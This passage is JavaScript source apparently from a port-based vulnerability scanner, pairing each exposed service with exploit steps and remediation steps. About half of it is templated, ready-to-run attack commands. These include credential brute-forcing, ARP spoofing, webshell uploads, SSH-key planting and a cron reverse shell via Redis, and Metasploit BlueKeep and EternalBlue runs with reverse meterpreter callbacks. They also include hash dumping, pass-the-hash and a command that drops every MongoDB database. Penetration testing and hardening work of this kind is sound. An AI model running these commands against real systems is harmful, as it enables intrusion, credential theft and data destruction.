import { scanTarget } from './scanner.js'

// ── Vulnerability rule database ───────────────────────────────────────────────

const PORT_RULES = [
  // ── Critical ──
  {
    ports: [23],
    severity: 'critical', cvss: 9.8,
    title: 'Cleartext Protocol: Telnet Exposed',
    description: 'Telnet is active on this host. All traffic — including credentials and session data — is transmitted in cleartext and can be trivially captured with a network sniffer.',
    remediation: 'Disable Telnet immediately. Replace with SSH on port 22. Block port 23 at the firewall perimeter.',
    cve: null, tags: ['cleartext', 'credentials'],
    exploitSteps: [
      {
        label: 'Confirm & connect',
        detail: 'Verify Telnet is open. Connect with netcat first to confirm the banner, then with the telnet client.',
        commands: [
          'nc -v {{target}} 23',
          'nmap -sV -p 23 {{target}}',
          '# Connect interactively:',
          'telnet {{target}}',
        ],
      },
      {
        label: 'Sniff cleartext credentials',
        detail: 'Telnet sends every keystroke — including the username and password — in plaintext. Passive capture on any shared network segment captures the full session.',
        commands: [
          '# Capture Telnet session on local interface:',
          'sudo tcpdump -i eth0 -A -s 0 "tcp port 23"',
          '# ARP poison to intercept traffic between two other hosts:',
          'sudo arpspoof -i eth0 -t {{target}} 192.168.1.1 &',
          'sudo arpspoof -i eth0 -t 192.168.1.1 {{target}} &',
          'sudo tcpdump -i eth0 -A -s 0 "tcp port 23" | grep -v "^$"',
        ],
      },
      {
        label: 'Brute force login',
        detail: 'If sniffing is not possible, brute force Telnet directly. No lockout is common on Telnet daemons.',
        commands: [
          'hydra -l root -P /usr/share/wordlists/rockyou.txt telnet://{{target}} -t 4 -vV',
          '# Try common default credentials first:',
          'hydra -C /usr/share/wordlists/metasploit/common_roots.txt telnet://{{target}} -t 4',
        ],
      },
      {
        label: 'Full shell access',
        detail: 'With captured or brute-forced credentials, log in and own the host. No further exploitation needed.',
        commands: [
          'telnet {{target}}',
          '# At prompt — enter captured credentials',
          'whoami',
          'uname -a',
          'cat /etc/shadow  # dump password hashes if root',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Disable and stop Telnet',
        detail: 'Stop the service immediately and prevent it from starting on reboot.',
        commands: [
          'sudo systemctl disable telnet.socket --now',
          'sudo systemctl stop telnet.socket',
          '# Verify it is no longer listening:',
          'ss -tlnp | grep 23',
          '# Remove the package entirely:',
          'sudo apt remove --purge telnetd telnet -y',
        ],
      },
      {
        label: 'Install and harden SSH',
        detail: 'SSH is the direct encrypted replacement for Telnet. Ensure only SSHv2 is permitted.',
        commands: [
          'sudo apt install openssh-server -y',
          '# Enforce SSHv2 only (SSHv1 is broken):',
          'sudo sed -i "s/^#*Protocol.*/Protocol 2/" /etc/ssh/sshd_config',
          '# Disable root login over SSH:',
          'sudo sed -i "s/^#*PermitRootLogin.*/PermitRootLogin no/" /etc/ssh/sshd_config',
          'sudo systemctl restart sshd',
        ],
      },
      {
        label: 'Block port 23 at firewall',
        detail: 'Add an explicit deny rule even after disabling the service — defence in depth.',
        commands: [
          'sudo ufw deny 23/tcp',
          '# Or with iptables:',
          'sudo iptables -A INPUT -p tcp --dport 23 -j DROP',
          'sudo iptables -A OUTPUT -p tcp --dport 23 -j DROP',
          'sudo iptables-save | sudo tee /etc/iptables/rules.v4',
        ],
      },
      {
        label: 'Audit accounts used via Telnet',
        detail: 'Any account that logged in over Telnet had its password captured. Rotate all credentials immediately.',
        commands: [
          '# Check last logins:',
          'last | grep -v reboot | head -20',
          '# Force password change for all interactive users:',
          'sudo chage -d 0 username  # forces reset on next login',
          '# Disable accounts not needed remotely:',
          'sudo usermod -L username  # locks the account',
        ],
      },
    ],
  },
  {
    ports: [3306],
    severity: 'critical', cvss: 9.0,
    title: 'MySQL Database Directly Accessible',
    description: 'A MySQL database server is reachable from the network. Database servers should never be directly network-accessible; they should only accept connections from the application layer.',
    remediation: 'Set bind-address = 127.0.0.1 in my.cnf. Restrict remote user grants. Place behind application tier or VPN.',
    cve: null, tags: ['database', 'exposure'],
    exploitSteps: [
      {
        label: 'Connect & test auth',
        detail: 'Attempt to connect as root with no password — the most common misconfiguration on self-hosted MySQL.',
        commands: [
          'mysql -h {{target}} -u root --password="" -e "SELECT version();"',
          '# Try common default passwords if blank fails:',
          'hydra -l root -P /usr/share/wordlists/metasploit/common_passwords.txt mysql://{{target}} -t 4',
        ],
      },
      {
        label: 'Enumerate databases',
        detail: 'Once connected, enumerate every database, table, and user account on the server.',
        commands: [
          'mysql -h {{target}} -u root -e "SHOW DATABASES;"',
          'mysql -h {{target}} -u root -e "SELECT user,host,authentication_string FROM mysql.user;"',
          'mysql -h {{target}} -u root -e "SHOW GRANTS FOR \'root\'@\'%\';"',
        ],
      },
      {
        label: 'Dump data',
        detail: 'Extract the entire database to a local file. mysqldump handles all tables and produces a ready-to-import SQL file.',
        commands: [
          'mysqldump -h {{target}} -u root --all-databases > /tmp/dump.sql',
          '# Target specific high-value tables:',
          'mysql -h {{target}} -u root -e "SELECT * FROM app_db.users LIMIT 100;"',
        ],
      },
      {
        label: 'Write webshell (FILE priv)',
        detail: 'If the MySQL user has the FILE privilege and the web root is known, write a PHP webshell directly to disk via SQL.',
        commands: [
          '# Check FILE privilege:',
          'mysql -h {{target}} -u root -e "SHOW GRANTS FOR CURRENT_USER;"',
          '# Write shell to web root:',
          'mysql -h {{target}} -u root -e "SELECT \'<?php system($_GET[cmd]); ?>\' INTO OUTFILE \'/var/www/html/shell.php\';"',
          '# Execute commands:',
          'curl "http://{{target}}/shell.php?cmd=id"',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Bind to localhost',
        detail: 'MySQL should only accept connections from the local machine unless a specific remote host is needed.',
        commands: [
          'sudo sed -i "s/^bind-address.*/bind-address = 127.0.0.1/" /etc/mysql/mysql.conf.d/mysqld.cnf',
          'sudo systemctl restart mysql',
          '# Verify no external listeners:',
          'ss -tlnp | grep 3306',
        ],
      },
      {
        label: 'Remove remote root access',
        detail: 'The root account should only be accessible from localhost. Remove any wildcard host entries.',
        commands: [
          'mysql -u root -e "DELETE FROM mysql.user WHERE User=\'root\' AND Host != \'localhost\';"',
          'mysql -u root -e "FLUSH PRIVILEGES;"',
          'mysql -u root -e "SELECT user,host FROM mysql.user;"',
        ],
      },
      {
        label: 'Create least-privilege app accounts',
        detail: 'Applications should use a dedicated account with only the permissions they need, not root.',
        commands: [
          'mysql -u root -e "CREATE USER \'appuser\'@\'localhost\' IDENTIFIED BY \'$(openssl rand -base64 16)\';"',
          'mysql -u root -e "GRANT SELECT,INSERT,UPDATE,DELETE ON appdb.* TO \'appuser\'@\'localhost\';"',
          'mysql -u root -e "FLUSH PRIVILEGES;"',
        ],
      },
      {
        label: 'Block port 3306 at firewall',
        detail: 'Even after binding to localhost, add an explicit firewall rule as defence-in-depth.',
        commands: [
          'sudo ufw deny 3306/tcp',
          '# Or with iptables:',
          'sudo iptables -A INPUT -p tcp --dport 3306 -j DROP',
          'sudo iptables-save | sudo tee /etc/iptables/rules.v4',
        ],
      },
    ],
  },
  {
    ports: [5432],
    severity: 'critical', cvss: 9.0,
    title: 'PostgreSQL Database Directly Accessible',
    description: 'PostgreSQL is reachable from the network. Direct database exposure bypasses application-layer controls and access auditing.',
    remediation: "Set listen_addresses = 'localhost' in postgresql.conf. Restrict pg_hba.conf to application hosts. Use SSL.",
    cve: null, tags: ['database', 'exposure'],
    exploitSteps: [
      { label: 'Connect', detail: 'psql -h <target> -U postgres — default superuser often accessible with blank password' },
      { label: 'Read Data', detail: '\\l to list databases; \\dt to list tables; SELECT * to dump records' },
      { label: 'OS Command Exec', detail: 'COPY TO/FROM or PROGRAM extension can execute OS commands as postgres user' },
      { label: 'Privilege Escalation', detail: 'postgres OS user on Linux is often passwordless; pivot to full system access' },
    ],
    patchSteps: [
      { label: 'Restrict listen address', detail: "Set listen_addresses = 'localhost' in postgresql.conf" },
      { label: 'Lock pg_hba.conf', detail: 'Allow only app server IP with md5/scram-sha-256 auth; remove trust entries' },
      { label: 'Enable SSL', detail: 'Set ssl = on in postgresql.conf; generate or use existing TLS certificate' },
      { label: 'Rotate passwords', detail: "ALTER USER postgres PASSWORD 'strong-random-password';" },
    ],
  },
  {
    ports: [27017, 27018],
    severity: 'critical', cvss: 9.8,
    title: 'MongoDB Exposed — Likely Unauthenticated',
    description: 'MongoDB is directly accessible. Many MongoDB deployments have no authentication enabled by default. Thousands of databases have been wiped and ransomed through this vector.',
    remediation: 'Enable --auth. Create admin credentials. Bind to localhost. Block 27017/27018 at the firewall.',
    cve: null, tags: ['database', 'nosql', 'exposure'],
    exploitSteps: [
      {
        label: 'Connect & enumerate',
        detail: 'mongosh connects with zero credentials in a default deployment. Instantly list all databases and collections.',
        commands: [
          'mongosh {{target}}:27017',
          '# Inside the shell:',
          'show dbs',
          'use admin; show collections',
          '# Or non-interactively:',
          'mongosh {{target}}:27017 --eval "db.adminCommand({listDatabases:1})"',
        ],
      },
      {
        label: 'Dump all data',
        detail: 'mongodump exports every database to BSON files locally. mongoexport produces readable JSON.',
        commands: [
          'mongodump --host {{target}} --port 27017 --out /tmp/mongo_dump/',
          '# Or export a specific collection as JSON:',
          'mongoexport --host {{target}} --db myapp --collection users --out /tmp/users.json',
          '# Quick count to assess scale:',
          'mongosh {{target}}:27017 --eval "db.getSiblingDB(\'myapp\').users.countDocuments()"',
        ],
      },
      {
        label: 'Wipe & ransom',
        detail: 'Automated botnet scripts drop all collections and insert a ransom note. This is widely deployed and can happen within hours of exposure.',
        commands: [
          '# Check existing ransom notes (common sign of prior compromise):',
          'mongosh {{target}}:27017 --eval "db.getSiblingDB(\'admin\').system.version.find()"',
          '# Attackers run something like:',
          'mongosh {{target}}:27017 --eval "db.adminCommand({listDatabases:1}).databases.forEach(d => { if(d.name !== \'admin\' && d.name !== \'local\') db.getSiblingDB(d.name).dropDatabase() })"',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Create admin user first',
        detail: 'You must create an admin account BEFORE enabling auth — otherwise you get locked out.',
        commands: [
          'mongosh {{target}}:27017',
          '# Inside shell:',
          'use admin',
          'db.createUser({ user: "admin", pwd: passwordPrompt(), roles: [{ role: "root", db: "admin" }] })',
          'exit',
        ],
      },
      {
        label: 'Enable authentication',
        detail: 'Add the security.authorization setting to mongod.conf and restart.',
        commands: [
          'sudo bash -c \'echo "security:\\n  authorization: enabled" >> /etc/mongod.conf\'',
          'sudo systemctl restart mongod',
          '# Verify auth is required:',
          'mongosh {{target}}:27017 --eval "show dbs"  # should error: Unauthorized',
        ],
      },
      {
        label: 'Bind to localhost',
        detail: 'Restrict the MongoDB listener to the loopback interface so it is unreachable from the network.',
        commands: [
          'sudo sed -i "s/bindIp:.*/bindIp: 127.0.0.1/" /etc/mongod.conf',
          'sudo systemctl restart mongod',
          'ss -tlnp | grep 27017  # should show 127.0.0.1 only',
        ],
      },
      {
        label: 'Block ports at firewall',
        detail: 'Block both 27017 and 27018 externally as a second layer of defence.',
        commands: [
          'sudo ufw deny 27017/tcp',
          'sudo ufw deny 27018/tcp',
          '# Or with iptables:',
          'sudo iptables -A INPUT -p tcp --dport 27017:27018 -j DROP',
          'sudo iptables-save | sudo tee /etc/iptables/rules.v4',
        ],
      },
    ],
  },
  {
    ports: [6379],
    severity: 'critical', cvss: 9.8,
    title: 'Redis Exposed — Potential RCE',
    description: 'Redis has no authentication by default and is directly reachable. An attacker can use the CONFIG SET / SLAVEOF commands to write arbitrary files (SSH keys, cron jobs) leading to remote code execution.',
    remediation: 'Set requirepass in redis.conf. Bind to 127.0.0.1. Rename or disable CONFIG and DEBUG commands.',
    cve: 'CVE-2022-0543', tags: ['database', 'rce', 'exposure'],
    exploitSteps: [
      {
        label: 'Verify access',
        detail: 'Connect with redis-cli and confirm there is no auth required. PING returns PONG — we have full unauthenticated access.',
        commands: [
          'redis-cli -h {{target}} PING',
          'redis-cli -h {{target}} INFO server | head -20',
          'redis-cli -h {{target}} CONFIG GET dir',
        ],
      },
      {
        label: 'Write SSH key',
        detail: 'Redirect Redis\'s save path to /root/.ssh and write our public key as the save file. BGSAVE forces the write to disk, giving us passwordless root SSH access.',
        commands: [
          '# Generate a keypair if needed:',
          'ssh-keygen -t rsa -b 4096 -f /tmp/redis_rsa -N ""',
          '# Pad the key (Redis save format needs newlines):',
          'echo -e "\\n\\n" > /tmp/redis_key.txt && cat /tmp/redis_rsa.pub >> /tmp/redis_key.txt && echo -e "\\n\\n" >> /tmp/redis_key.txt',
          'redis-cli -h {{target}} CONFIG SET dir /root/.ssh',
          'redis-cli -h {{target}} CONFIG SET dbfilename authorized_keys',
          'redis-cli -h {{target}} SET payload "$(cat /tmp/redis_key.txt)"',
          'redis-cli -h {{target}} BGSAVE',
        ],
      },
      {
        label: 'SSH in as root',
        detail: 'The BGSAVE wrote our public key to /root/.ssh/authorized_keys. We now SSH in with our private key — no password required.',
        commands: [
          'ssh -i /tmp/redis_rsa root@{{target}}',
          'whoami  # should return: root',
        ],
      },
      {
        label: 'Alternative: cron shell',
        detail: 'If SSH is not open, write a cron job that calls back to our listener instead.',
        commands: [
          '# Start listener on Kali:',
          'nc -lvnp 4444 &',
          '# Write cron reverse shell:',
          'redis-cli -h {{target}} CONFIG SET dir /var/spool/cron/crontabs',
          'redis-cli -h {{target}} CONFIG SET dbfilename root',
          'redis-cli -h {{target}} SET shell "\\n\\n* * * * * bash -i >& /dev/tcp/{{kali_ip}}/4444 0>&1\\n\\n"',
          'redis-cli -h {{target}} BGSAVE',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Set a strong password',
        detail: 'requirepass forces all clients to authenticate before any command. Use a long random string — Redis has no rate limiting so short passwords are brute-forceable.',
        commands: [
          '# Generate a strong password:',
          'openssl rand -base64 32',
          '# Add to redis.conf:',
          'sudo sed -i "s/^# requirepass.*/requirepass $(openssl rand -base64 32)/" /etc/redis/redis.conf',
          'sudo systemctl restart redis-server',
          '# Test auth is required:',
          'redis-cli -h localhost PING  # should return: NOAUTH',
        ],
      },
      {
        label: 'Bind to localhost',
        detail: 'Redis should never listen on a public interface. Binding to 127.0.0.1 restricts connections to the local machine only.',
        commands: [
          'sudo sed -i "s/^bind.*/bind 127.0.0.1/" /etc/redis/redis.conf',
          'sudo systemctl restart redis-server',
          '# Verify it is no longer reachable externally:',
          'ss -tlnp | grep 6379',
        ],
      },
      {
        label: 'Disable dangerous commands',
        detail: 'Rename CONFIG, DEBUG, SLAVEOF, and FLUSHALL to empty strings, making them uncallable. This is a defense-in-depth measure even if auth is set.',
        commands: [
          'sudo bash -c \'echo "rename-command CONFIG \\"\\"\nrename-command DEBUG \\"\\"\nrename-command SLAVEOF \\"\\"\nrename-command FLUSHALL \\"\\"\nrename-command FLUSHDB \\"\\"" >> /etc/redis/redis.conf\'',
          'sudo systemctl restart redis-server',
        ],
      },
      {
        label: 'Block port 6379 at firewall',
        detail: 'Even with the bind fix, add an explicit firewall rule as a second layer.',
        commands: [
          'sudo ufw deny 6379/tcp',
          '# Or with iptables:',
          'sudo iptables -A INPUT -p tcp --dport 6379 -j DROP',
          'sudo iptables-save | sudo tee /etc/iptables/rules.v4',
        ],
      },
    ],
  },
  {
    ports: [9200, 9300],
    severity: 'critical', cvss: 9.0,
    title: 'Elasticsearch Exposed Without Auth',
    description: 'Elasticsearch is network-accessible. Older clusters have no authentication by default, giving full read/write access to all indices.',
    remediation: 'Enable X-Pack security (TLS + authentication). Bind to internal interfaces. Block 9200/9300 at the perimeter.',
    cve: null, tags: ['database', 'exposure'],
    exploitSteps: [
      { label: 'Enumerate', detail: 'curl http://<target>:9200/_cat/indices — lists all indices, no auth' },
      { label: 'Dump index', detail: 'curl http://<target>:9200/<index>/_search?size=10000 — returns all documents' },
      { label: 'Modify data', detail: 'PUT/DELETE requests alter or destroy data without any credential check' },
      { label: 'Pivot via scripts', detail: 'Groovy script injection on older ES versions executes OS commands as the es user' },
    ],
    patchSteps: [
      { label: 'Enable X-Pack security', detail: 'Set xpack.security.enabled: true in elasticsearch.yml; requires ES 6.8+ or 7.1+' },
      { label: 'Set passwords', detail: 'Run: bin/elasticsearch-setup-passwords interactive to set all built-in user passwords' },
      { label: 'Bind to internal IP', detail: 'Set network.host to internal/localhost address only in elasticsearch.yml' },
      { label: 'Firewall 9200/9300', detail: 'Block both ports at perimeter; allow only Kibana/app servers from internal VLAN' },
    ],
  },
  // ── High ──
  {
    ports: [21],
    severity: 'high', cvss: 7.5,
    title: 'FTP Service Exposed',
    description: 'FTP transmits credentials and file data in cleartext. Anonymous access is enabled in many default configurations, allowing unauthenticated read or write of files.',
    remediation: 'Replace with SFTP (SSH) or FTPS. Disable anonymous access. Enforce strong passwords and restrict to known IPs.',
    cve: null, tags: ['cleartext', 'anonymous-access'],
    exploitSteps: [
      {
        label: 'Anonymous login',
        detail: 'Many FTP servers allow anonymous login by default. Connect with username "anonymous" and any string as the password.',
        commands: [
          'ftp {{target}}',
          '# At the prompt: Name: anonymous  Password: guest@example.com',
          '# Or non-interactively:',
          'curl -v ftp://anonymous:guest@{{target}}/',
          'nmap -p 21 --script ftp-anon {{target}}',
        ],
      },
      {
        label: 'Enumerate & download',
        detail: 'Once connected, list all files recursively and pull anything sensitive — configs, backups, credentials.',
        commands: [
          '# In ftp shell:',
          'ls -la',
          'mget *  # download everything',
          '# Or with wget (recursive anonymous download):',
          'wget -m --no-passive ftp://anonymous:guest@{{target}}/',
          '# Search for sensitive filenames:',
          'find /tmp/ftp_download -name "*.conf" -o -name "*.key" -o -name "*.sql" -o -name ".env"',
        ],
      },
      {
        label: 'Credential sniff',
        detail: 'FTP sends USER and PASS in cleartext. Wireshark or tcpdump captures them off any shared network segment.',
        commands: [
          '# Capture FTP auth on the local interface:',
          'sudo tcpdump -i eth0 -A -s 0 "tcp port 21" | grep -E "USER|PASS"',
          '# Wireshark filter for FTP creds:',
          '# ftp.request.command == "USER" || ftp.request.command == "PASS"',
          '# Brute force if sniff is not possible:',
          'hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://{{target}} -t 10 -vV',
        ],
      },
      {
        label: 'Upload webshell',
        detail: 'If the FTP root overlaps with the web root and write is permitted, drop a PHP shell and get code execution.',
        commands: [
          '# Create the shell:',
          'echo "<?php system(\\$_GET[\'cmd\']); ?>" > /tmp/shell.php',
          '# Upload via ftp:',
          'ftp {{target}} <<EOF\nanonymous\nguest\nput /tmp/shell.php shell.php\nbye\nEOF',
          '# Trigger via browser or curl:',
          'curl "http://{{target}}/shell.php?cmd=id"',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Disable anonymous access',
        detail: 'The most important fix — no anonymous login should be permitted.',
        commands: [
          'sudo sed -i "s/anonymous_enable=YES/anonymous_enable=NO/" /etc/vsftpd.conf',
          'sudo systemctl restart vsftpd',
          '# Verify anonymous is rejected:',
          'curl -v ftp://anonymous:test@{{target}}/',
        ],
      },
      {
        label: 'Migrate to SFTP',
        detail: 'SFTP is SSH file transfer — encrypted, authenticated, and already available if SSH is running. No separate server needed.',
        commands: [
          '# Enable SFTP in sshd_config (usually already present):',
          'grep -i sftp /etc/ssh/sshd_config',
          '# Add if missing:',
          'echo "Subsystem sftp /usr/lib/openssh/sftp-server" | sudo tee -a /etc/ssh/sshd_config',
          'sudo systemctl restart sshd',
          '# Test SFTP connection:',
          'sftp user@{{target}}',
        ],
      },
      {
        label: 'Enable FTPS if FTP must stay',
        detail: 'FTPS wraps FTP in TLS. Enable explicit TLS in vsftpd to encrypt credentials and data.',
        commands: [
          '# Generate a self-signed cert (or use existing):',
          'sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/vsftpd.key -out /etc/ssl/certs/vsftpd.pem',
          '# Add to /etc/vsftpd.conf:',
          'sudo bash -c \'echo "ssl_enable=YES\nrsa_cert_file=/etc/ssl/certs/vsftpd.pem\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\nforce_local_logins_ssl=YES\nforce_local_data_ssl=YES" >> /etc/vsftpd.conf\'',
          'sudo systemctl restart vsftpd',
        ],
      },
      {
        label: 'Restrict by IP at firewall',
        detail: 'If FTP must remain open, limit it to known trusted IPs only.',
        commands: [
          '# Allow only a specific IP (replace 10.0.0.5 with your IP):',
          'sudo ufw allow from 10.0.0.5 to any port 21',
          'sudo ufw deny 21/tcp',
          '# Or with iptables:',
          'sudo iptables -A INPUT -p tcp --dport 21 -s 10.0.0.5 -j ACCEPT',
          'sudo iptables -A INPUT -p tcp --dport 21 -j DROP',
        ],
      },
    ],
  },
  {
    ports: [3389],
    severity: 'high', cvss: 9.8,
    title: 'RDP Directly Accessible',
    description: 'Remote Desktop Protocol is exposed. RDP is the primary ransomware entry vector and has had multiple critical unauthenticated RCE vulnerabilities (BlueKeep, DejaBlue, CVE-2023-28267).',
    remediation: 'Require VPN or RD Gateway before RDP access. Enable NLA. Configure account lockout. Apply all Windows patches.',
    cve: 'CVE-2019-0708', tags: ['remote-access', 'brute-force', 'ransomware'],
    exploitSteps: [
      {
        label: 'Fingerprint & check patches',
        detail: 'First confirm the RDP port is open and check which OS/patch level is running. Nmap has scripts that detect BlueKeep and DejaBlue vulnerability status without triggering a crash.',
        commands: [
          'nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {{target}}',
          '# Check for BlueKeep (CVE-2019-0708) — safe check, no crash:',
          'msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS {{target}}; run; exit"',
          '# Grab OS version from RDP fingerprint:',
          'nmap -sV -p 3389 {{target}}',
        ],
      },
      {
        label: 'BlueKeep exploit (CVE-2019-0708)',
        detail: 'BlueKeep is a pre-auth RCE in Windows 7 / Server 2008 RDP. The Metasploit module sends a malformed MS_T120 channel request that triggers a heap overflow and executes shellcode as SYSTEM.',
        commands: [
          'msfconsole -q',
          'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
          'set RHOSTS {{target}}',
          'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
          'set LHOST {{kali_ip}}',
          'set TARGET 2  # adjust: 0=auto, 1=Win7 SP1, 2=Win7 SP1 w/ ESU',
          'exploit',
        ],
      },
      {
        label: 'Credential brute force',
        detail: 'If the host is patched against BlueKeep, brute force is the next option. Crowbar and Hydra both support RDP. Use -t 1 to avoid triggering lockout — RDP is slower than SSH.',
        commands: [
          '# Crowbar (RDP-aware, handles NLA):',
          'crowbar -b rdp -s {{target}}/32 -u Administrator -C /usr/share/wordlists/rockyou.txt -n 1',
          '# Hydra alternative:',
          'hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://{{target}} -t 1 -vV',
          '# Check for common weak passwords first (faster):',
          'hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt rdp://{{target}} -t 1',
        ],
      },
      {
        label: 'RDP session hijacking',
        detail: 'Once on the machine, tscon.exe lets you hijack other users\' disconnected RDP sessions without their password — including admin sessions left open by sysadmins.',
        commands: [
          '# List active/disconnected sessions:',
          'query session',
          '# Hijack session ID 2 (run as SYSTEM via PsExec or sc.exe):',
          'sc.exe create hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"',
          'net start hijack',
          '# Cleanup:',
          'sc.exe delete hijack',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Block 3389 at the firewall',
        detail: 'RDP should never be directly internet-facing. Require VPN or an RD Gateway (HTTPS port 443) as the entry point.',
        commands: [
          '# Windows Firewall — block inbound 3389 from all except VPN subnet:',
          'netsh advfirewall firewall add rule name="Block RDP" dir=in action=block protocol=tcp localport=3389',
          'netsh advfirewall firewall add rule name="Allow RDP VPN" dir=in action=allow protocol=tcp localport=3389 remoteip=10.0.0.0/8',
        ],
      },
      {
        label: 'Apply BlueKeep patches',
        detail: 'CVE-2019-0708 is patched by KB4499175 (Win7) and KB4499149 (Server 2008 R2). Run Windows Update or apply directly.',
        commands: [
          '# Check patch status (PowerShell):',
          'Get-HotFix -Id KB4499175,KB4499149',
          '# Apply all pending updates:',
          'Install-WindowsUpdate -AcceptAll -AutoReboot',
          '# Or via wusa.exe with downloaded MSU:',
          'wusa.exe C:\\patches\\KB4499175.msu /quiet /norestart',
        ],
      },
      {
        label: 'Enable Network Level Authentication',
        detail: 'NLA requires valid credentials before the RDP session is established, preventing pre-auth exploits like BlueKeep from reaching the vulnerable code path.',
        commands: [
          '# Enable NLA via PowerShell:',
          'Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" -Name "UserAuthentication" -Value 1',
          '# Verify:',
          'Get-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" -Name UserAuthentication',
        ],
      },
      {
        label: 'Configure account lockout',
        detail: 'Without lockout, brute force runs indefinitely. Set a low threshold — 5 attempts is reasonable for RDP.',
        commands: [
          '# Via Group Policy (local):',
          'net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30',
          '# Verify settings:',
          'net accounts',
        ],
      },
    ],
  },
  {
    ports: [445],
    severity: 'high', cvss: 8.1,
    title: 'SMB Exposed to Network',
    description: 'SMB (port 445) is accessible. EternalBlue (CVE-2017-0144) exploited SMB to detonate WannaCry and NotPetya globally. SMBv1 is critically unsafe.',
    remediation: 'Block port 445 at the perimeter. Apply MS17-010. Disable SMBv1. Enable SMB signing.',
    cve: 'CVE-2017-0144', tags: ['lateral-movement', 'ransomware'],
    exploitSteps: [
      {
        label: 'Check SMBv1 & patches',
        detail: 'Nmap\'s smb-vuln-ms17-010 script safely checks whether the target is vulnerable to EternalBlue without crashing it.',
        commands: [
          'nmap -p 445 --script smb-vuln-ms17-010,smb2-security-mode,smb-security-mode {{target}}',
          '# Also check SMB version and signing status:',
          'nmap -p 445 --script smb-protocols {{target}}',
          '# Metasploit scanner (no exploit — just detection):',
          'msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {{target}}; run; exit"',
        ],
      },
      {
        label: 'EternalBlue (MS17-010)',
        detail: 'If vulnerable, EternalBlue exploits a buffer overflow in SMBv1\'s transaction handling. The Metasploit module delivers a Meterpreter shell as SYSTEM with no credentials required.',
        commands: [
          'msfconsole -q',
          'use exploit/windows/smb/ms17_010_eternalblue',
          'set RHOSTS {{target}}',
          'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
          'set LHOST {{kali_ip}}',
          'exploit',
          '# Once in Meterpreter:',
          'getuid   # should return: NT AUTHORITY\\SYSTEM',
          'hashdump # dump all local account hashes',
        ],
      },
      {
        label: 'NTLM hash capture',
        detail: 'On networks where we can intercept traffic, Responder poisons LLMNR/NBT-NS to capture NTLM hashes. These can be cracked offline or used directly in Pass-the-Hash attacks.',
        commands: [
          '# Start Responder to capture hashes:',
          'sudo responder -I eth0 -wrf',
          '# Hashes are saved to /usr/share/responder/logs/. Crack with hashcat:',
          'hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt',
          '# Pass-the-Hash with Impacket (uses NTLMv1 hash, not cracked password):',
          'impacket-psexec Administrator@{{target}} -hashes :{{ntlm_hash}}',
        ],
      },
      {
        label: 'SMB lateral movement',
        detail: 'With valid credentials or a captured hash, Impacket\'s psexec/smbexec can run commands on remote Windows hosts over SMB — the same technique used by ransomware to spread.',
        commands: [
          '# Execute command as remote SYSTEM:',
          'impacket-psexec domain/user:password@{{target}} cmd.exe',
          '# Stealthier (no service install):',
          'impacket-smbexec domain/user:password@{{target}}',
          '# Enumerate shares:',
          'impacket-smbclient domain/user:password@{{target}}',
          '# List all SMB hosts in subnet for worm-style spread:',
          'nmap -p 445 --open 192.168.1.0/24 -oG - | awk "/445\/open/{print \$2}"',
        ],
      },
    ],
    patchSteps: [
      {
        label: 'Apply MS17-010 (EternalBlue patch)',
        detail: 'This is the highest-priority fix. KB4012212 patches SMBv1 on Windows 7 / Server 2008 R2. Other OS versions have equivalent patches.',
        commands: [
          '# Check if already patched:',
          'Get-HotFix -Id KB4012212,KB4012215,KB4012217',
          '# Apply via PowerShell (requires PSWindowsUpdate module):',
          'Install-Module PSWindowsUpdate -Force',
          'Install-WindowsUpdate -KBArticleID KB4012212 -AcceptAll',
        ],
      },
      {
        label: 'Disable SMBv1',
        detail: 'SMBv1 is 30 years old and should not exist on any modern network. Disabling it removes the EternalBlue attack surface entirely.',
        commands: [
          '# Disable SMBv1 server:',
          'Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force',
          '# Disable SMBv1 client:',
          'Set-SmbClientConfiguration -EnableSMB1Protocol $false -Force',
          '# Verify:',
          'Get-SmbServerConfiguration | Select EnableSMB1Protocol',
          '# Also disable via Windows Features:',
          'Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart',
        ],
      },
      {
        label: 'Block 445 at the perimeter',
        detail: 'SMB should never cross a network perimeter. Block TCP 445 in both directions at the firewall.',
        commands: [
          '# Windows Firewall — block inbound SMB from internet:',
          'netsh advfirewall firewall add rule name="Block SMB Inbound" dir=in action=block protocol=tcp localport=445',
          '# Linux iptables:',
          'sudo iptables -A INPUT -p tcp --dport 445 -j DROP',
          'sudo iptables-save | sudo tee /etc/iptables/rules.v4',
        ],
      },
      {
        label: 'Enable SMB signing',
        detail: 'SMB signing prevents Man-in-the-Middle attacks by cryptographically signing all SMB traffic. This blocks NTLM relay attacks.',
        commands: [
          '# Require signing on the server (PowerShell):',
          'Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -Force',
          '# Verify:',
          'Get-SmbServerConfiguration | Select RequireSecuritySignature',
          '# Via GPO path: Computer Config → Windows Settings → Security Settings → Local Policies → Security Options',
          '# Set: "Microsoft network server: Digitally sign communications (always)" = Enabled',
        ],
      },
    ],
  },
  {
